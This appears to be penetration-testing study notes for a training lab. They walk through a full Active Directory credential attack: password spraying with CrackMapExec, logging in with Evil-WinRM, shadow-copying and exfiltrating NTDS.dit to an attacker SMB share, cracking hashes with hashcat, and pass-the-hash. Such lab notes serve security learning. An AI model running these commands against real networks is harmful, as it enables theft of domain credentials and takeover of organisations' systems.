
When a Windows system joins a domain, it will send all authentication requests to the DC before allowing a user to log on. SAM authentication is still possible by specifying the hostname followed by the username: `WS01/Username`

### CrackMapExec AD Dictionary Attacks

Use this [tool](https://github.com/urbanadventurer/username-anarchy) to generate potential usernames against a list of known users

###### Username Anarchy Example Usage
```go
./username-anarchy -i /home/ltnbob/names.txt 
```

###### Launching CrackMapExec

Using the name(s) found we then use a wordlist of known passwords to attack SMB

```go
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

If authentication is successful, we will attempt to capture the NTDS.dit file from the DC

### Capturing NTDS.dit

>[! Note]  
>NT Directory Services . directory information tree
> Directory service used to find and organize network resources.
> Stored at the below location:
>>	%systemroot%/ntds
> It is the primary database file associated with AD and contains all domain usernames, password hashes, etc.

#### Connecting to a Domain Controller via Evil-WinRM

> [!hint] Connect with the bwilliamson credentials
```go
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```


Once on the box check for privileges such as local admin rights etc. This is important because to copy the NTDS.dit file, you will need local admin or Domain Admin rights:
```go
net localgroup
```

From the user output, this user has domain admin and admin rights. 

#### Creating a shadow copy of C:

>[! hint]
> - Use vssadmin to create a volume shadow copy of the C: drive
> - NTDS is stored on the C: drive by default, but destination may be different

```go
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```


#### Copying NTDS.dit form the VSS

Copy the NTDS.dit file from the shadow copy of C: to another location on the drive:
```go
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

>[! hint ] Create Share on Attack Host
> To move the NTDS.dit file, use the [[Attacking SAM#Syntax for smbserver.py]] technique

#### Transferring NTDS.dit to Attack Host

```go
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

#### CrackMapExec One-liner

The below will execute all steps from above:
```go
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Cracking Hashes

Create a file containing all the hashes to crack or do it individually

```go
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### PtH via Evil-WinRM

We could have  PtH with evil-winrm
```go
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

